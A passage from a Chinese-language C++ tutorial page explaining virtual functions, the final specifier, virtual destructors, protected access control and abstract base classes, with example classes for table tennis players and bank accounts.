class="title">func</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> <span class="keyword">final</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MoreDerived</span> :</span> <span class="keyword">public</span> Derived &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// virtual void func() const override; // 错误！因为 Derived::func 被标记为 final</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CannotInherit</span> <span class="keyword">final</span> :</span> <span class="keyword">public</span> Base &#123; <span class="comment">// 这个类不能被继承</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// class Problem : public CannotInherit &#123;&#125;; // 错误！</span></span><br></pre></td></tr></table></figure></li><li><p> <strong>构造函数不能是虚函数:</strong> 对象的类型在构造完成之前是未确定的，因此构造函数无法实现动态联编。</p></li><li><p><strong>析构函数应该是虚函数:</strong> 如果一个类打算作为基类（特别是如果可能通过基类指针 <code>delete</code> 派生类对象），那么它的析构函数<strong>应该</strong>声明为虚函数 (<code>virtual ~Base();</code>)。</p><ul><li>  <strong>原因:</strong> 考虑 <code>Base *p = new Derived; delete p;</code>。如果 <code>~Base()</code> 不是虚函数，<code>delete p;</code> 只会调用 <code>~Base()</code>，派生类 <code>Derived</code> 的析构函数 <code>~Derived()</code> 将<strong>不会</strong>被调用，可能导致派生类分配的资源（如动态内存）泄漏。如果 <code>~Base()</code> 是虚函数，<code>delete p;</code> 会通过动态联编正确地调用 <code>~Derived()</code>，然后再调用 <code>~Base()</code>，确保所有资源都被释放。</li><li>  <strong>规则:</strong> 如果类中有任何虚函数，通常就应该提供一个虚析构函数。即使基类析构函数什么也不做，也应将其声明为 <code>virtual</code>。</li></ul></li><li><p> <strong>友元函数不能是虚函数:</strong> 友元函数不是类的成员函数，继承机制不适用于它们。</p></li><li><p> <strong>静态成员函数不能是虚函数:</strong> 静态成员函数与类本身关联，而不是与特定对象关联（没有 <code>this</code> 指针），因此动态联编对其没有意义。</p></li></ol><p>理解静态联编和动态联编的区别，以及何时、如何使用虚函数，是掌握 C++ 多态特性和编写健壮、可扩展的面向对象代码的关键。</p><h2 id="13-5-访问控制：protected"><a href="#13-5-访问控制：protected" class="headerlink" title="13.5 访问控制：protected"></a>13.5 访问控制：protected</h2><p>到目前为止，我们使用了 <code>public</code> 和 <code>private</code> 访问说明符来控制对类成员的访问。</p><ul><li>  <code>public</code> 成员可以被任何地方的代码访问。</li><li>  <code>private</code> 成员只能被定义它们的类的成员函数（以及友元）访问。</li></ul><p>在继承的背景下，<code>private</code> 成员有一个重要的限制：<strong>基类的 <code>private</code> 成员不能被派生类的成员函数直接访问</strong>。派生类需要通过基类的 <code>public</code> 或 <code>protected</code> 接口（方法）来间接与基类的私有数据交互。</p><p>C++ 提供了第三个访问说明符：**<code>protected</code>**。</p><p><strong><code>protected</code> 成员的访问规则:</strong></p><ul><li>  对于<strong>类的外部</strong>（非成员函数，非派生类），<code>protected</code> 成员的行为与 <code>private</code> 成员<strong>相同</strong>，即不可访问。</li><li>  对于<strong>类的成员函数</strong>（以及友元），<code>protected</code> 成员的行为与 <code>public</code> 成员<strong>相同</strong>，即可直接访问。</li><li>  对于<strong>派生类的成员函数</strong>，<code>protected</code> 成员的行为也与 <code>public</code> 成员<strong>相同</strong>，即派生类<strong>可以</strong>直接访问基类的 <code>protected</code> 成员。</li></ul><p><strong>总结访问权限:</strong></p><table><thead><tr><th align="left">访问来源</th><th align="left"><code>public</code> 成员</th><th align="left"><code>protected</code> 成员</th><th align="left"><code>private</code> 成员</th></tr></thead><tbody><tr><td align="left">类内部 (成员函数)</td><td align="left">可访问</td><td align="left">可访问</td><td align="left">可访问</td></tr><tr><td align="left">派生类 (成员函数)</td><td align="left">可访问</td><td align="left"><strong>可访问</strong></td><td align="left"><strong>不可访问</strong></td></tr><tr><td align="left">类外部 (普通代码)</td><td align="left">可访问</td><td align="left"><strong>不可访问</strong></td><td align="left"><strong>不可访问</strong></td></tr></tbody></table><p><strong>示例：修改 <code>TableTennisPlayer</code> 使用 <code>protected</code></strong></p><p>让我们修改 <code>TableTennisPlayer</code> 类，将 <code>firstname</code> 和 <code>lastname</code> 设为 <code>protected</code>，看看 <code>RatedPlayer</code> 如何访问它们。</p><p><strong>tabtenn_prot.h (使用 protected 的版本)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TABTENN_PROT_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABTENN_PROT_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 基类 - 使用 protected 成员</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TableTennisPlayerProt</span> &#123;</span></span><br><span class="line"><span class="comment">// protected 成员:</span></span><br><span class="line"><span class="keyword">protected</span>: <span class="comment">// 改为 protected</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> firstname;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> lastname;</span><br><span class="line"><span class="keyword">private</span>:   <span class="comment">// hasTable 仍然是 private</span></span><br><span class="line">    <span class="keyword">bool</span> hasTable;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TableTennisPlayerProt (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                           <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                           <span class="keyword">bool</span> ht = <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// Name() 不再需要，因为派生类可以直接访问 protected 成员来构建自己的 Name()</span></span><br><span class="line">    <span class="comment">// virtual void Name() const; // 可以移除或保留</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">HasTable</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> hasTable; &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetTable</span><span class="params">(<span class="keyword">bool</span> v)</span> </span>&#123; hasTable = v; &#125;;</span><br><span class="line">    <span class="keyword">virtual</span> ~TableTennisPlayerProt() &#123; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 派生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RatedPlayerProt</span> :</span> <span class="keyword">public</span> TableTennisPlayerProt &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> rating;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    RatedPlayerProt (<span class="keyword">unsigned</span> <span class="keyword">int</span> r = <span class="number">0</span>, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                     <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln = <span class="string">&quot;none&quot;</span>, <span class="keyword">bool</span> ht = <span class="literal">false</span>);</span><br><span class="line">    RatedPlayerProt(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> TableTennisPlayerProt &amp; tp);</span><br><span class="line">    <span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">Rating</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> rating; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetRating</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> r)</span> </span>&#123; rating = r; &#125;</span><br><span class="line">    <span class="comment">// 派生类可以直接访问基类的 protected 成员</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ShowInfo</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// 新增一个方法来演示访问</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// TABTENN_PROT_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>tabtenn_prot.cpp (实现)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tabtenn_prot.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// TableTennisPlayerProt 方法</span></span><br><span class="line">TableTennisPlayerProt::TableTennisPlayerProt (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn,</span><br><span class="line">                                              <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln, <span class="keyword">bool</span> ht)</span><br><span class="line">                                              : firstname(fn), lastname(ln), hasTable(ht) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RatedPlayerProt 方法</span></span><br><span class="line">RatedPlayerProt::RatedPlayerProt(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn,</span><br><span class="line">                                 <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln, <span class="keyword">bool</span> ht)</span><br><span class="line">                                 : TableTennisPlayerProt(fn, ln, ht), rating(r) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：这个构造函数仍然需要调用基类构造函数，</span></span><br><span class="line"><span class="comment">// 因为即使 firstname/lastname 是 protected，初始化也应由基类负责。</span></span><br><span class="line"><span class="comment">// 但如果基类没有提供合适的构造函数，派生类可以在其构造函数体中</span></span><br><span class="line"><span class="comment">// 直接给 protected 成员赋值 (虽然不推荐)。</span></span><br><span class="line">RatedPlayerProt::RatedPlayerProt(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> TableTennisPlayerProt &amp; tp)</span><br><span class="line">                                 : TableTennisPlayerProt(tp), rating(r) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 派生类方法可以直接访问基类的 protected 成员</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RatedPlayerProt::ShowInfo</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 直接访问继承来的 protected 成员 firstname 和 lastname</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; lastname &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; firstname;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;; Rating: &quot;</span> &lt;&lt; rating;</span><br><span class="line">    <span class="comment">// 不能直接访问基类的 private 成员 hasTable</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; HasTable(); // 需要通过基类的 public 方法访问</span></span><br><span class="line">    <span class="keyword">if</span> (HasTable())</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;; Has Table: Yes\n&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;; Has Table: No\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用示例 (usett_prot.cpp)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tabtenn_prot.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">( <span class="keyword">void</span> )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">RatedPlayerProt <span class="title">rplayer1</span><span class="params">(<span class="number">1140</span>, <span class="string">&quot;Mallory&quot;</span>, <span class="string">&quot;Duck&quot;</span>, <span class="literal">true</span>)</span></span>;</span><br><span class="line">    <span class="function">TableTennisPlayerProt <span class="title">player1</span><span class="params">(<span class="string">&quot;Tara&quot;</span>, <span class="string">&quot;Boomdea&quot;</span>, <span class="literal">false</span>)</span></span>; <span class="comment">// 基类对象</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Rated Player Info:\n&quot;</span>;</span><br><span class="line">    rplayer1.ShowInfo(); <span class="comment">// 调用派生类方法，该方法访问了基类的 protected 成员</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 外部代码不能直接访问 protected 成员</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; rplayer1.firstname; // 错误！firstname 是 protected</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; player1.lastname;  // 错误！lastname 是 protected</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 外部代码可以访问 public 成员</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nPlayer 1 Has Table? &quot;</span> &lt;&lt; player1.HasTable() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// OK</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译和运行:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ usett_prot.cpp tabtenn_prot.cpp -o usett_prot</span><br><span class="line">./usett_prot</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Rated Player Info:</span><br><span class="line">Name: Duck, Mallory; Rating: 1140; Has Table: Yes</span><br><span class="line"></span><br><span class="line">Player 1 Has Table? 0</span><br></pre></td></tr></table></figure><p><strong>使用 <code>protected</code> 的利弊:</strong></p><ul><li><strong>优点:</strong><ul><li>  为派生类提供比 <code>private</code> 更大的访问权限，允许派生类更直接地与基类实现交互。</li><li>  相比 <code>public</code>，仍然对外部世界隐藏了实现细节。</li></ul></li><li><strong>缺点:</strong><ul><li>  <strong>破坏封装:</strong> 将成员设为 <code>protected</code> 而不是 <code>private</code>，意味着基类的实现细节暴露给了所有派生类。如果将来修改基类的 <code>protected</code> 成员，可能会影响所有派生类，增加了类之间的耦合度。</li><li>  <strong>维护困难:</strong> 随着继承层次的加深，追踪哪些类依赖于特定的 <code>protected</code> 成员会变得困难。</li></ul></li></ul><p><strong>设计建议:</strong></p><ul><li>  优先使用 <code>private</code> 成员，并通过 <code>public</code> 或 <code>protected</code> <strong>成员函数</strong>提供对数据的访问（如果需要）。这提供了更好的封装和灵活性。</li><li>  只有当你确定派生类确实需要直接访问基类的某个实现细节，并且提供 <code>public/protected</code> 接口不方便或效率低下时，才考虑使用 <code>protected</code> 数据成员。</li><li>  <code>protected</code> <strong>成员函数</strong>通常比 <code>protected</code> <strong>数据成员</strong>更受欢迎，因为它们提供了受控的访问接口，而不是直接暴露数据。</li></ul><p>总之，<code>protected</code> 提供了一种介于 <code>private</code> 和 <code>public</code> 之间的访问控制级别，主要用于管理基类和派生类之间的访问权限。</p><h2 id="13-6-抽象基类"><a href="#13-6-抽象基类" class="headerlink" title="13.6 抽象基类"></a>13.6 抽象基类</h2><p>在设计类层次结构时，我们有时会遇到这样一种情况：基类本身代表的是一个非常<strong>抽象</strong>的概念，以至于创建该基类的对象本身没有意义。它存在的目的主要是为了定义一个<strong>共同的接口</strong>，供所有具体的派生类来实现。这种只作为接口规范、不能被实例化的基类称为**抽象基类 (Abstract Base Class, ABC)**。</p><p>例如，考虑一个图形库，可能有一个 <code>Shape</code> 基类。但什么是“形状”本身？它太抽象了。我们实际操作的是具体的形状，如 <code>Circle</code>（圆）、<code>Rectangle</code>（矩形）、<code>Triangle</code>（三角形）等。创建一个通用的 <code>Shape</code> 对象可能没有意义，但我们希望所有具体的形状类都提供某些共同的操作，比如计算面积 (<code>Area()</code>) 或绘制 (<code>Draw()</code>)。</p><p>C++ 通过<strong>纯虚函数 (Pure Virtual Function)</strong> 来实现抽象基类。</p><p><strong>纯虚函数 (Pure Virtual Function):</strong></p><ul><li><p>  纯虚函数是一种特殊的虚函数，它在基类中<strong>没有提供实现</strong>（或者说，实现被延迟到派生类）。</p></li><li><p>  它用于声明一个接口，强制所有非抽象的派生类必须提供自己的实现。</p></li><li><p><strong>语法:</strong> 在虚函数声明的末尾加上 <code>= 0</code>。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> ReturnType <span class="title">FunctionName</span><span class="params">(parameters)</span> <span class="keyword">const</span> </span>= <span class="number">0</span>; <span class="comment">// 纯虚函数声明</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>抽象基类 (ABC) 的定义:</strong></p><ul><li>  包含<strong>至少一个</strong>纯虚函数的类就是抽象基类 (ABC)。</li></ul><p><strong>ABC 的特性:</strong></p><ol><li><p><strong>不能实例化:</strong> 你<strong>不能</strong>创建抽象基类的对象。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设 Shape 是一个 ABC</span></span><br><span class="line"><span class="comment">// Shape myShape; // 错误！不能创建 ABC 的对象</span></span><br></pre></td></tr></table></figure><p> 编译器会阻止你这样做，因为 ABC 中的纯虚函数没有实现，对象是不完整的。</p></li><li><p> <strong>可以作为接口:</strong> ABC 主要用作定义接口。它规定了所有派生类必须实现哪些方法。</p></li><li><p><strong>可以有指针和引用:</strong> 虽然不能创建 ABC 的对象，但你可以声明指向 ABC 的<strong>指针</strong>或<strong>引用</strong>。这些指针或引用可以指向或引用其<strong>具体的派生类对象</strong>。这对于实现多态至关重要。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设 Circle 是从 Shape 派生的具体类</span></span><br><span class="line">Shape * shapePtr = <span class="keyword">new</span> Circle(<span class="number">5.0</span>); <span class="comment">// OK: 基类指针指向派生类对象</span></span><br><span class="line">Shape &amp; shapeRef = *shapePtr;       <span class="comment">// OK: 基类引用引用派生类对象</span></span><br></pre></td></tr></table></figure></li><li><p> <strong>派生类必须实现纯虚函数:</strong> 任何从 ABC 派生的类，如果<strong>没有</strong>为继承来的<strong>所有</strong>纯虚函数提供实现，那么这个派生类<strong>也</strong>将成为一个抽象基类，同样不能被实例化。只有当派生类实现了所有继承的纯虚函数时，它才成为**具体类 (Concrete Class)**，可以被实例化。</p></li></ol><h3 id="13-6-1-应用-ABC-概念"><a href="#13-6-1-应用-ABC-概念" class="headerlink" title="13.6.1 应用 ABC 概念"></a>13.6.1 应用 ABC 概念</h3><p>让我们定义一个简单的银行账户 ABC <code>AcctABC</code>。一个通用的“账户”可能无法直接操作，但所有具体的账户类型（如支票账户、储蓄账户）都应该有查询余额、存款、取款等操作。</p><p><strong>acctabc.h (ABC 定义)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ACCTABC_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ACCTABC_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 抽象基类 AcctABC</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AcctABC</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> fullName;</span><br><span class="line">    <span class="keyword">long</span> acctNum;</span><br><span class="line">    <span class="keyword">double</span> balance;</span><br><span class="line"><span class="keyword">protected</span>: <span class="comment">// 改为 protected 以便派生类访问</span></span><br><span class="line">    <span class="comment">// 辅助格式化函数 (protected，派生类可用)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Formatting</span> &#123;</span></span><br><span class="line">        <span class="built_in">std</span>::ios_base::fmtflags flag;</span><br><span class="line">        <span class="built_in">std</span>::streamsize pr;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; <span class="title">FullName</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> fullName; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">AcctNum</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> acctNum; &#125;</span><br><span class="line">    <span class="function">Formatting <span class="title">SetFormat</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Restore</span><span class="params">(Formatting &amp; f)</span> <span class="keyword">const</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数 (ABC 也可以有构造函数)</span></span><br><span class="line">    AcctABC(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s = <span class="string">&quot;Nullbody&quot;</span>, <span class="keyword">long</span> an = <span class="number">-1</span>,</span><br><span class="line">            <span class="keyword">double</span> bal = <span class="number">0.0</span>);</span><br><span class="line">    <span class="comment">// 存款</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Deposit</span><span class="params">(<span class="keyword">double</span> amt)</span></span>;</span><br><span class="line">    <span class="comment">// 取款 - 设为纯虚函数，具体实现在派生类</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Withdraw</span><span class="params">(<span class="keyword">double</span> amt)</span> </span>= <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 查询余额</span></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">Balance</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> balance; &#125;</span><br><span class="line">    <span class="comment">// 查看账户信息 - 设为纯虚函数</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">ViewAcct</span><span class="params">()</span> <span class="keyword">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 虚析构函数 (基类有虚函数，析构函数也应是虚的)</span></span><br><span class="line">    <span class="keyword">virtual</span> ~AcctABC() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 具体的派生类: Brass Account (支票账户)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Brass</span> :</span> <span class="keyword">public</span> AcctABC &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Brass(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s = <span class="string">&quot;Nullbody&quot;</span>, <span class="keyword">long</span> an = <span class="number">-1</span>,</span><br><span class="line">          <span class="keyword">double</span> bal = <span class="number">0.0</span>) : AcctABC(s, an, bal) &#123;&#125;</span><br><span class="line">    <span class="comment">// 实现基类的纯虚函数 Withdraw</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Withdraw</span><span class="params">(<span class="keyword">double</span> amt)</span> <span class="keyword">override</span></span>;</span><br><span class="line">    <span class="comment">// 实现基类的纯虚函数 ViewAcct</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">ViewAcct</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span></span>;</span><br><span class="line">    <span class="comment">// Brass 类没有新的纯虚函数，所以是具体类</span></span><br><span class="line">    <span class="keyword">virtual</span> ~Brass() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 具体的派生类: BrassPlus Account (带透支保护的支票账户)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BrassPlus</span> :</span> <span class="keyword">public</span> AcctABC &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">double</span> maxLoan;     <span class="comment">// 最大透支额</span></span><br><span class="line">    <span class="keyword">double</span> rate;        <span class="comment">// 透支利率</span></span><br><span class="line">    <span class="keyword">double</span> owesBank;    <span class="comment">// 当前欠款</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    BrassPlus(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s = <span class="string">&quot;Nullbody&quot;</span>, <span class="keyword">long</span> an = <span class="number">-1</span>,</span><br><span class="line">              <span class="keyword">double</span> bal = <span class="number">0.0</span>, <span 